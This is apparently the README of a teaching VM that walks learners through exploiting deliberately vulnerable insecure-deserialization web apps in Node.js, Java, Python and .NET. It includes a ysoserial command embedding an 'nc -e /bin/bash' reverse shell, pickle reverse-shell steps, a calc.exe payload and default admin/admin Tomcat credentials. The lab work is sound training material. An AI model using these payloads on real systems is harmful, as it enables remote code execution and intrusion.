# Insecure DEserialization Attack box (IDEAbox)

A virtual machine with several web applications to demonstrate insecure deserialization vulnerabilities and ways to exploit them.

## Setup

### Prerequisites

1. Vagrant
2. VirtualBox

### Installation

`vagrant up`

## Usage

If the installation goes well (if it doesn't, let me know!), three web applications are available:

- Cookie spoofing (Node.js) - http://localhost:3001
- Denial of service (Java) - http://localhost:3002/ideabox
- Remote code execution (Python) - http://localhost:3004


### Cookie spoofing (Node.js, JSON)

1. Go to http://localhost:3002
2. Click on *insecure*
   - Open browser developer tools and analyze the `user` cookie
      - What does it look like?
      - Is it encoded in some way?
      - What do you see if you decode it?
   - Can you modify the cookie and elevate privileges?
3. Go to *secure* and check the cookie
   - Can you spoof it now? Why not?
   - Look at the source code in `web/node` to understand why.


### Denial of service (Java, native serialization)

1. Go to http://localhost:3003/ideabox
2. Go to *Factory* 
   - Download an object and store it on disk.
   - What does it look like? (native Java serialized object).
3. Go to *Store*
   - Upload an object and see what happens (all should be good)
4. Go to *Hacktory* and get the payloads
   - Go back to *Store* and upload.
   - What's going on?
5. Go to *Secure Store* and try the payloads
   - The application rejects malicious stuff.
   - Look at the code in `web/java/WEB-INF/classes` to understand why.

*Note: you can access Tomcat Manager at http://localhost:3003/manager Of course it's secure! The user name is 'admin', and the password is 'admin' :)*


### Remote code execution (Python, pickle)

1. Go to http://localhost:3005
2. Look at the `session` cookie. Does it look like, maybe, Python serialized data?
3. Go to `web/python` and generate a payload:
   `python3 payload.py`
4. Fire up a local netcat listener:
   `nc -nlvp 1337`
5. In the browser, replace the `session` cookie with the payload and reload the page
6. Did netcat get a connection? It's a reverse shell! Run a few shell command and see.
7. Look at the code in `web/python` to understand why


### Remote code execution (Java, native)

1. Download [ysoserial](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)
1. Generate the payload:
   `java -jar ~/tools/ysoserial.jar CommonsBeanutils1 'nc -e /bin/bash 10.0.2.2 1337' > revshell.ser`
1. Fire up a local netcat listener:
   `nc -nlvp 1337`
1. Go to http://localhost:3003/ideabox
1. Go to *Store*
1. "Sell" the payload


### Remote code execution (.NET, native)

You'll need a Windows machine with Visual Studio. You can use [Windows 10 dev env VM](https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/)

1. Download [ysoserial.net](https://github.com/pwntester/ysoserial.net), open and compile the solution in Visual Studio.
1. In Command Line window, navigate to the folder that contains the compiled executable (e.g. ysoserial\bin\Debug) and generate the payload:
   `ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o raw -c "calc.exe" > \Users\User\execute-calc.raw`
1. Open [CyberPark.sln](web/net/CyberPark/CyberPark.sln) in Visual Studio, compile and run. It should open a browser window with http://localhost:50376
1. Start Ubuntu app in Windows and try the following to see how the API works:
   1. `curl -s http://localhost:50376/api/auth`
   1. `curl -s http://localhost:50376/api/auth -H "Authorization: AAEAAAD/////AQAAAAAAAAARAQAAAAIAAAAGAgAAAAN0aGUGAwAAAARiZXN0Cw=="`
1. Finally, send the payload:
   `curl -s http://localhost:50376/api/auth -H "Authorization: $(base64 -w 0 execute-calc.raw)"`
   and enjoy the Calculator.


